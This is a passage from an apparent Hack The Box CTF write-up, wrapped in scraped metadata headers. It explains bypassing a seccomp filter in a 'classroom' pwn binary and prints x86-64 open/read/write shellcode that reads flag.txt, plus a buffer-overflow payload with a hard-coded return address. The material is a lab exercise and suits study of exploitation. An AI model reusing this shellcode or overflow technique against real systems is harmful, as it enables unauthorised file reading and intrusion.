@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://medium.com/@adi.ashour/hack-the-box-ctf-classroom-pwn-challenge-a4e6013ebb9e
+CHALLENGE: Hack The Box CTF classroom pwn challenge | by Adi Ben David
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: execve, read
+KEY_TECHNIQUE: A new exploit So now that we know why our first exploit didn’t work and what we’re allowed to use, we can make a better exploit.
+---
+for a while. I went in with gdb and tried examining the values everywhere — registers, stack, anything I could think to query. I couldn’t find my error in the input I’m sending. Finally, I tried using strace . One of the things we notice when running our program under strace is a call to seccomp . So lets find it in the code. A short search will find us a function called sec() (that’s actually called from main() — oops, my bad 😅) sec() function So now we can see what syscalls are allowed in this program and which aren’t. According to the linux syscall table : 0 — read 1 — write 2 — open 0xf — rt_sigreturn 0x3c — exit So indeed execve which we needed for executing /bin/sh isn’t allowed. A new exploit So now that we know why our first exploit didn’t work and what we’re allowed to use, we can make a better exploit. A quick google search finds us this shell code that allows us to read a file called /etc/passwd . To adjust it to our usage, we need to replace this xor byte [rdi + 11], 0x41 with nops ( \x90 ) since in our use case we don’t need a NULL terminated string. We’ll also replace the bytes representing the file name /etc/passwd with our desired file to read. We’ll make an educated guess for the file name with the flag: flag.txt . So we get: my_bash = b'\xeb\x3f\x5f\x90\x90\x90\x90\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff' file_name = b'flag.txt' my_bash += file_name exploit = my_bash + b'n'*(0x60-len(my_bash))+(b'y'*4+b'y'*0x1f)*5+b'a'*105+struct.pack("Q", 0x0040090c) Run the exploit Again, we write the created string into a file and send as input to the classroom program running in the decker: Successful exploit output Now we can see that after entering the kids_are_not_allowed_here function, the content of the flag.txt file is printed to the screen. Pwned
